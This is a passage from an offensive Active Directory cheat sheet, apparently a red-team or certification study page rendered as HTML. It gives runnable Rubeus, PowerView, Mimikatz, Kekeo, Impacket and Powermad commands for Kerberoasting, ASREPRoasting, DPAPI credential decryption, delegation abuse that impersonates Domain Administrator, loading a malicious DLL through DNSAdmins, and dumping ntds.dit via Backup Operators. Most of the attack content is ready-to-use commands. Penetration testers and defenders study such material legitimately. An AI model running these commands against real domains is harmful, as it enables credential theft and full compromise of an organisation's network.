</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>  #Kerberoast spesific user account
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple
</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a>
</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a>  #Kerberoast by specifying the authentication credentials
</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a>  Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;
</span></code></pre></div>
<ul>
<li>ASREPRoast</li>
</ul>
<p><em>WUT IS DIS?:</em> \
 If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted<br />
 blob and bruteforce it offline.</p>
<ul>
<li>PowerView: <code>Get-DomainUser -PreauthNotRequired -Verbose</code></li>
<li>AD Module: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li>
</ul>
<p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
Check for interesting permissions on accounts:</p>
<p><strong>Hint:</strong> We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!</p>
<p>PowerView:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &quot;RDPUsers&quot;}
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>Disable Kerberos Preauth:
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>Set-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>Check if the value changed:
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>Get-DomainUser -PreauthNotRequired -Verbose
</span></code></pre></div>
<ul>
<li>And finally execute the attack using the <a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a> tool.</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>  #Get a spesific Accounts hash:
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>  Get-ASREPHash -UserName &lt;UserName&gt; -Verbose
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>  #Get any ASREPRoastable Users hashes:
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>  Invoke-ASREPRoast -Verbose
</span></code></pre></div>
<ul>
<li>Using Rubeus:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>  #Trying the attack for all domain users
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>  Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>  #ASREPRoast spesific user
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>  Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>  #ASREPRoast users of a spesific OU (Organization Unit)
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>  Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;
</span></code></pre></div>
<ul>
<li>Using Impacket:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>  #Trying the attack for the specified users on the file
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>  python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;
</span></code></pre></div>
<ul>
<li>Password Spray Attack</li>
</ul>
<p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.</p>
<p><strong>Tools:</strong></p>
<ul>
<li><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
<li><a href="https://github.com/wavestone-cdt/Invoke-CleverSpray">Invoke-CleverSpray</a></li>
<li>
<p><a href="https://github.com/Greenwolf/Spray">Spray</a></p>
</li>
<li>
<p>Force Set SPN</p>
</li>
</ul>
<p><em>WUT IS DIS ?:
If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.</em></p>
<ul>
<li>PowerView:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>  #Check for interesting permissions on accounts:
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &quot;RDPUsers&quot;}
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>  #Check if current user has already an SPN setted:
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>  Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>  #Force set the SPN on the account:
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>  Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname=&#39;ops/whatever1&#39;}
</span></code></pre></div>
<ul>
<li>AD Module:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>  #Check if current user has already an SPN setted
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>  Get-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>  #Force set the SPN on the account:
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>  Set-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add=&#39;ops/whatever1&#39;}
</span></code></pre></div>
<p>Finally use any tool from before to grab the hash and kerberoast it!</p>
<ul>
<li>Abusing Shadow Copies</li>
</ul>
<p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>#List shadow copies using vssadmin (Needs Admnistrator Access)
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>vssadmin list shadows
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>#List shadow copies using diskshadow
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>diskshadow list shadows all
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>
</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>#Make a symlink to the shadow copy and access it
</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
</span></code></pre></div>
<ol>
<li>You can dump the backuped SAM database and harvest credentials.</li>
<li>Look for DPAPI stored creds and decrypt them.</li>
<li>
<p>Access backuped sensitive files.</p>
</li>
<li>
<p>List and Decrypt Stored Credentials using Mimikatz</p>
</li>
</ol>
<p>Usually encrypted credentials are stored in:</p>
<ul>
<li><code>%appdata%\Microsoft\Credentials</code></li>
<li><code>%localappdata%\Microsoft\Credentials</code></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>dpapi::cred /in:&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>#From the previous command we are interested to the &quot;guidMasterKey&quot; parameter, that tells us which masterkey was used to encrypt the credential
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>#Lets enumerate the Master Key:
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>dpapi::masterkey /in:&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;
</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>
</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>dpapi::masterkey /in:&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot; /rpc
</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>
</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>#We now have the masterkey in our local cache:
</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>dpapi::cache
</span><span id="__span-46-13"><a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>
</span><span id="__span-46-14"><a id="__codelineno-46-14" name="__codelineno-46-14" href="#__codelineno-46-14"></a>#Finally we can decrypt the credential using the cached masterkey:
</span><span id="__span-46-15"><a id="__codelineno-46-15" name="__codelineno-46-15" href="#__codelineno-46-15"></a>dpapi::cred /in:&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;
</span></code></pre></div>
<p>Detailed Article:
<a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">DPAPI all the things</a></p>
<ul>
<li>Unconstrained Delegation</li>
</ul>
<p><em>WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!</em></p>
<p>Using PowerView:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>#Discover domain joined computers that have Unconstrained Delegation enabled
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>Get-NetComputer -UnConstrained
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>#List tickets and check if a DA or some High Value target has stored its TGT
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::tickets&quot;&#39;
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>#Command to monitor any incoming sessions on our compromised server
</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>Invoke-UserHunter -ComputerName &lt;NameOfTheComputer&gt; -Poll &lt;TimeOfMonitoringInSeconds&gt; -UserName &lt;UserToMonitorFor&gt; -Delay
</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>&lt;WaitInterval&gt; -Verbose
</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>
</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>#Dump the tickets to disk:
</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::tickets /export&quot;&#39;
</span><span id="__span-47-13"><a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a>
</span><span id="__span-47-14"><a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a>#Impersonate the user using ptt attack:
</span><span id="__span-47-15"><a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a>Invoke-Mimikatz -Command &#39;&quot;kerberos::ptt &lt;PathToTicket&gt;&quot;&#39;
</span></code></pre></div>
<p><strong>Note:</strong> We can also use Rubeus!</p>
<ul>
<li>Constrained Delegation</li>
</ul>
<p>Using PowerView and Kekeo:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>#Enumerate Users and Computers with constrained delegation
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>Get-DomainUser -TrustedToAuth
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>Get-DomainComputer -TrustedToAuth
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>tgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain&#39;s FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain&#39;s FQDN&gt; /service:&lt;Service&#39;s SPN&gt;
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a>
</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a>#Finally use mimikatz to ptt the TGS
</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a>Invoke-Mimikatz -Command &#39;&quot;kerberos::ptt &lt;PathToTGS&gt;&quot;&#39;
</span></code></pre></div>
<p><em>ALTERNATIVE:</em>
Using Rubeus:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:&quot;&lt;Service&#39;s SPN&gt;&quot; /altservice:&lt;Optional&gt; /ptt
</span></code></pre></div>
<p>Now we can access the service as the impersonated user!</p>
<p>:triangular_flag_on_post: <strong>What if we have delegation rights for only a spesific SPN? (e.g TIME):</strong></p>
<p>In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p>
<ul>
<li>Resource Based Constrained Delegation</li>
</ul>
<p><em>WUT IS DIS?: \
TL;DR \
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.</em></p>
<p>Tools we are going to use:</p>
<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon">PowerView</a></li>
<li><a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
</ul>
<p>First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p>
<p>Exploitation Example:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>#Import Powermad and use it to create a new MACHINE ACCOUNT
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>. .\Powermad.ps1
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>New-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString &#39;p@ssword!&#39; -AsPlainText -Force) -Verbose
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>#Import PowerView and get the SID of our new created machine account
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>. .\PowerView.ps1
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a>$SDBytes = New-Object byte[] ($SD.BinaryLength)
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>$SD.GetBinaryForm($SDBytes, 0)
</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a>
</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a>#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we&#39;re taking over, again using PowerView
</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a>Get-DomainComputer TargetMachine | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
</span><span id="__span-50-16"><a id="__codelineno-50-16" name="__codelineno-50-16" href="#__codelineno-50-16"></a>
</span><span id="__span-50-17"><a id="__codelineno-50-17" name="__codelineno-50-17" href="#__codelineno-50-17"></a>#After that we need to get the RC4 hash of the new machine account&#39;s password using Rubeus
</span><span id="__span-50-18"><a id="__codelineno-50-18" name="__codelineno-50-18" href="#__codelineno-50-18"></a>Rubeus.exe hash /password:&#39;p@ssword!&#39;
</span><span id="__span-50-19"><a id="__codelineno-50-19" name="__codelineno-50-19" href="#__codelineno-50-19"></a>
</span><span id="__span-50-20"><a id="__codelineno-50-20" name="__codelineno-50-20" href="#__codelineno-50-20"></a>#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
</span><span id="__span-50-21"><a id="__codelineno-50-21" name="__codelineno-50-21" href="#__codelineno-50-21"></a>Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
</span><span id="__span-50-22"><a id="__codelineno-50-22" name="__codelineno-50-22" href="#__codelineno-50-22"></a>
</span><span id="__span-50-23"><a id="__codelineno-50-23" name="__codelineno-50-23" href="#__codelineno-50-23"></a>#Finally we can access the C$ drive of the target machine
</span><span id="__span-50-24"><a id="__codelineno-50-24" name="__codelineno-50-24" href="#__codelineno-50-24"></a>dir \\TargetMachine.wtver.domain\C$
</span></code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li>
<li><a href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/">RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</a></li>
</ul>
<p>:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>#Command on Rubeus
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>Rubeus.exe tgtdeleg /nowrap
</span></code></pre></div>
<p>Detailed Article:
<a href="https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/">Rubeus – Now With More Kekeo</a></p>
<h2 id="dnsadmins-abuse">DNSAdmins Abuse</h2>
<p><em>WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.</em></p>
<ol>
<li>Enumerate the members of the DNSAdmins group:</li>
<li>PowerView: <code>Get-NetGroupMember -GroupName "DNSAdmins"</code></li>
<li>AD Module: <code>Get-ADGroupMember -Identiny DNSAdmins</code></li>
<li>Once we found a member of this group we need to compromise it (There are many ways).</li>
<li>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>   #Using dnscmd:
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>   dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>   #Restart the DNS Service:
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>   sc \\DNSServer stop dns
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>   sc \\DNSServer start dns
</span></code></pre></div>
<ul>
<li>
<p>Abusing Active Directory-Integraded DNS</p>
</li>
<li>
<p><a href="https://blog.netspi.com/exploiting-adidns/">Exploiting Active Directory-Integrated DNS</a></p>
</li>
<li><a href="https://blog.netspi.com/adidns-revisited/">ADIDNS Revisited</a></li>
<li>
<p><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></p>
</li>
<li>
<p>Abusing Backup Operators Group</p>
</li>
</ul>
<p><em>WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.</em></p>
<ol>
<li>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>   #Create a .txt file that will contain the shadow copy process script
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>   Script -&gt;{
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>   set context persistent nowriters
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>   set metadata c:\windows\system32\spool\drivers\color\example.cab
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>   set verbose on
</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>   begin backup
</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a>   add volume c: alias mydrive
</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a>
</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>   create
</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a>
</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a>   expose %mydrive% w:
</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>   end backup
</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a>   }
</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a>
</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a>   #Execute diskshadow with our script as parameter
</span><span id="__span-53-16"><a id="__codelineno-53-16" name="__codelineno-53-16" href="#__codelineno-53-16"></a>   diskshadow /s script.txt
</span></code></pre></div>
<ol>
<li>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
   going to use <a href="https://github.com/giuliano108/SeBackupPrivilege">tSeBackupPrivilege</a> amazing repo:</li>
</ol>
